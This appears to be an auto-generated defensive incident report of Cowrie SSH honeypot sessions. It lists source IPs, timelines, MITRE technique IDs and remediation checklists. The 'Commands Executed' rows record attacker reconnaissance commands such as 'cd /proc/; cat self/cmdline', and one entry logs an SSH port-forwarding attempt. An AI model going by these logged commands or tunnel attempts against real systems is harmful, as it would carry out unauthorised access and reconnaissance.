| **First Seen** | 2026-07-13 12:00 |
| **Last Seen** | 2026-07-13 12:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:00:56` | `cowrie.session.connect` |
| `2026-07-13 12:00:56` | `cowrie.login.success` |
| `2026-07-13 12:00:57` | `cowrie.session.params` |
| `2026-07-13 12:00:57` | `cowrie.command.input` |
| `2026-07-13 12:01:06` | `cowrie.log.closed` |
| `2026-07-13 12:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c839c6e5d018

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:01 |
| **Last Seen** | 2026-07-13 12:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:01:06` | `cowrie.session.connect` |
| `2026-07-13 12:01:06` | `cowrie.login.success` |
| `2026-07-13 12:01:07` | `cowrie.session.params` |
| `2026-07-13 12:01:07` | `cowrie.command.input` |
| `2026-07-13 12:01:16` | `cowrie.log.closed` |
| `2026-07-13 12:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aad917151257

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:01 |
| **Last Seen** | 2026-07-13 12:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:01:16` | `cowrie.session.connect` |
| `2026-07-13 12:01:16` | `cowrie.login.success` |
| `2026-07-13 12:01:17` | `cowrie.session.params` |
| `2026-07-13 12:01:17` | `cowrie.command.input` |
| `2026-07-13 12:01:26` | `cowrie.log.closed` |
| `2026-07-13 12:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88af14be67d6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:01 |
| **Last Seen** | 2026-07-13 12:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:01:26` | `cowrie.session.connect` |
| `2026-07-13 12:01:27` | `cowrie.login.success` |
| `2026-07-13 12:01:27` | `cowrie.session.params` |
| `2026-07-13 12:01:27` | `cowrie.command.input` |
| `2026-07-13 12:01:37` | `cowrie.log.closed` |
| `2026-07-13 12:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b87cf10f0c99

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:01 |
| **Last Seen** | 2026-07-13 12:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:01:37` | `cowrie.session.connect` |
| `2026-07-13 12:01:37` | `cowrie.login.success` |
| `2026-07-13 12:01:38` | `cowrie.session.params` |
| `2026-07-13 12:01:38` | `cowrie.command.input` |
| `2026-07-13 12:01:47` | `cowrie.log.closed` |
| `2026-07-13 12:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64756ecb4adf

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:01 |
| **Last Seen** | 2026-07-13 12:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:01:47` | `cowrie.session.connect` |
| `2026-07-13 12:01:47` | `cowrie.login.success` |
| `2026-07-13 12:01:48` | `cowrie.session.params` |
| `2026-07-13 12:01:48` | `cowrie.command.input` |
| `2026-07-13 12:01:57` | `cowrie.log.closed` |
| `2026-07-13 12:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9424a0f9c03f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:01 |
| **Last Seen** | 2026-07-13 12:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:01:57` | `cowrie.session.connect` |
| `2026-07-13 12:01:57` | `cowrie.login.success` |
| `2026-07-13 12:01:58` | `cowrie.session.params` |
| `2026-07-13 12:01:58` | `cowrie.command.input` |
| `2026-07-13 12:02:07` | `cowrie.log.closed` |
| `2026-07-13 12:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626af4e1547a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:02 |
| **Last Seen** | 2026-07-13 12:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:02:07` | `cowrie.session.connect` |
| `2026-07-13 12:02:08` | `cowrie.login.success` |
| `2026-07-13 12:02:08` | `cowrie.session.params` |
| `2026-07-13 12:02:08` | `cowrie.command.input` |
| `2026-07-13 12:02:18` | `cowrie.log.closed` |
| `2026-07-13 12:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d37c63789919

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:02 |
| **Last Seen** | 2026-07-13 12:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:02:18` | `cowrie.session.connect` |
| `2026-07-13 12:02:18` | `cowrie.login.success` |
| `2026-07-13 12:02:19` | `cowrie.session.params` |
| `2026-07-13 12:02:19` | `cowrie.command.input` |
| `2026-07-13 12:02:28` | `cowrie.log.closed` |
| `2026-07-13 12:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46b1d5618433

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:02 |
| **Last Seen** | 2026-07-13 12:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:02:28` | `cowrie.session.connect` |
| `2026-07-13 12:02:28` | `cowrie.login.success` |
| `2026-07-13 12:02:29` | `cowrie.session.params` |
| `2026-07-13 12:02:29` | `cowrie.command.input` |
| `2026-07-13 12:02:38` | `cowrie.log.closed` |
| `2026-07-13 12:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee049ebcfbfe

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:02 |
| **Last Seen** | 2026-07-13 12:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:02:38` | `cowrie.session.connect` |
| `2026-07-13 12:02:39` | `cowrie.login.success` |
| `2026-07-13 12:02:39` | `cowrie.session.params` |
| `2026-07-13 12:02:39` | `cowrie.command.input` |
| `2026-07-13 12:02:49` | `cowrie.log.closed` |
| `2026-07-13 12:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d90597c6c9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:02 |
| **Last Seen** | 2026-07-13 12:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:02:49` | `cowrie.session.connect` |
| `2026-07-13 12:02:49` | `cowrie.login.success` |
| `2026-07-13 12:02:50` | `cowrie.session.params` |
| `2026-07-13 12:02:50` | `cowrie.command.input` |
| `2026-07-13 12:02:59` | `cowrie.log.closed` |
| `2026-07-13 12:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07707a47970d

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:02 |
| **Last Seen** | 2026-07-13 12:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:02:59` | `cowrie.session.connect` |
| `2026-07-13 12:02:59` | `cowrie.login.success` |
| `2026-07-13 12:03:00` | `cowrie.session.params` |
| `2026-07-13 12:03:00` | `cowrie.command.input` |
| `2026-07-13 12:03:09` | `cowrie.log.closed` |
| `2026-07-13 12:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f5de724b5ae

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:03 |
| **Last Seen** | 2026-07-13 12:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:03:10` | `cowrie.session.connect` |
| `2026-07-13 12:03:10` | `cowrie.login.success` |
| `2026-07-13 12:03:10` | `cowrie.session.params` |
| `2026-07-13 12:03:10` | `cowrie.command.input` |
| `2026-07-13 12:03:20` | `cowrie.log.closed` |
| `2026-07-13 12:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3f95eadd94b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 12:03 |
| **Last Seen** | 2026-07-13 12:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:03:18` | `cowrie.session.connect` |
| `2026-07-13 12:03:18` | `cowrie.client.version` |
| `2026-07-13 12:03:18` | `cowrie.client.kex` |
| `2026-07-13 12:03:19` | `cowrie.login.success` |
| `2026-07-13 12:03:19` | `cowrie.session.params` |
| `2026-07-13 12:03:19` | `cowrie.command.input` |
| `2026-07-13 12:03:21` | `cowrie.log.closed` |
| `2026-07-13 12:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6a314107e4

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:03 |
| **Last Seen** | 2026-07-13 12:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:03:20` | `cowrie.session.connect` |
| `2026-07-13 12:03:20` | `cowrie.login.success` |
| `2026-07-13 12:03:21` | `cowrie.session.params` |
| `2026-07-13 12:03:21` | `cowrie.command.input` |
| `2026-07-13 12:03:30` | `cowrie.log.closed` |
| `2026-07-13 12:03:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec284e6f3f9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:03 |
| **Last Seen** | 2026-07-13 12:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:03:30` | `cowrie.session.connect` |
| `2026-07-13 12:03:30` | `cowrie.login.success` |
| `2026-07-13 12:03:31` | `cowrie.session.params` |
| `2026-07-13 12:03:31` | `cowrie.command.input` |
| `2026-07-13 12:03:40` | `cowrie.log.closed` |
| `2026-07-13 12:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03af8d3129f5

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:03 |
| **Last Seen** | 2026-07-13 12:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:03:40` | `cowrie.session.connect` |
| `2026-07-13 12:03:41` | `cowrie.login.success` |
| `2026-07-13 12:03:41` | `cowrie.session.params` |
| `2026-07-13 12:03:41` | `cowrie.command.input` |
| `2026-07-13 12:03:51` | `cowrie.log.closed` |
| `2026-07-13 12:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe29e4d9c76c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:03 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:03:51` | `cowrie.session.connect` |
| `2026-07-13 12:03:51` | `cowrie.login.success` |
| `2026-07-13 12:03:52` | `cowrie.session.params` |
| `2026-07-13 12:03:52` | `cowrie.command.input` |
| `2026-07-13 12:04:01` | `cowrie.log.closed` |
| `2026-07-13 12:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b47d8576e962

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:01` | `cowrie.session.connect` |
| `2026-07-13 12:04:01` | `cowrie.login.success` |
| `2026-07-13 12:04:02` | `cowrie.session.params` |
| `2026-07-13 12:04:02` | `cowrie.command.input` |
| `2026-07-13 12:04:11` | `cowrie.log.closed` |
| `2026-07-13 12:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2946b76bc1aa

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:11` | `cowrie.session.connect` |
| `2026-07-13 12:04:12` | `cowrie.login.success` |
| `2026-07-13 12:04:12` | `cowrie.session.params` |
| `2026-07-13 12:04:12` | `cowrie.command.input` |
| `2026-07-13 12:04:22` | `cowrie.log.closed` |
| `2026-07-13 12:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c126bbd006e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:13` | `cowrie.session.connect` |
| `2026-07-13 12:04:13` | `cowrie.client.version` |
| `2026-07-13 12:04:13` | `cowrie.client.kex` |
| `2026-07-13 12:04:13` | `cowrie.login.success` |
| `2026-07-13 12:04:13` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:04:13` | `cowrie.direct-tcpip.ja4` |
| `2026-07-13 12:04:13` | `cowrie.direct-tcpip.data` |
| `2026-07-13 12:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75edaffba21a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:22` | `cowrie.session.connect` |
| `2026-07-13 12:04:22` | `cowrie.login.success` |
| `2026-07-13 12:04:23` | `cowrie.session.params` |
| `2026-07-13 12:04:23` | `cowrie.command.input` |
| `2026-07-13 12:04:32` | `cowrie.log.closed` |
| `2026-07-13 12:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20b55a20c0b4

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:32` | `cowrie.session.connect` |
| `2026-07-13 12:04:32` | `cowrie.login.success` |
| `2026-07-13 12:04:33` | `cowrie.session.params` |
| `2026-07-13 12:04:33` | `cowrie.command.input` |
| `2026-07-13 12:04:42` | `cowrie.log.closed` |
| `2026-07-13 12:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1b91ba97c7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:37` | `cowrie.session.connect` |
| `2026-07-13 12:04:37` | `cowrie.client.version` |
| `2026-07-13 12:04:37` | `cowrie.client.kex` |
| `2026-07-13 12:04:37` | `cowrie.login.success` |
| `2026-07-13 12:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ab9f7102f6

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:37` | `cowrie.session.connect` |
| `2026-07-13 12:04:37` | `cowrie.client.version` |
| `2026-07-13 12:04:37` | `cowrie.client.kex` |
| `2026-07-13 12:04:37` | `cowrie.login.success` |
| `2026-07-13 12:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3b28d60e83

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:42` | `cowrie.session.connect` |
| `2026-07-13 12:04:43` | `cowrie.login.success` |
| `2026-07-13 12:04:43` | `cowrie.session.params` |
| `2026-07-13 12:04:43` | `cowrie.command.input` |
| `2026-07-13 12:04:53` | `cowrie.log.closed` |
| `2026-07-13 12:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaafd9efacb2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:04 |
| **Last Seen** | 2026-07-13 12:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:04:53` | `cowrie.session.connect` |
| `2026-07-13 12:04:53` | `cowrie.login.success` |
| `2026-07-13 12:04:54` | `cowrie.session.params` |
| `2026-07-13 12:04:54` | `cowrie.command.input` |
| `2026-07-13 12:05:03` | `cowrie.log.closed` |
| `2026-07-13 12:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9510fe1070

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:05 |
| **Last Seen** | 2026-07-13 12:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
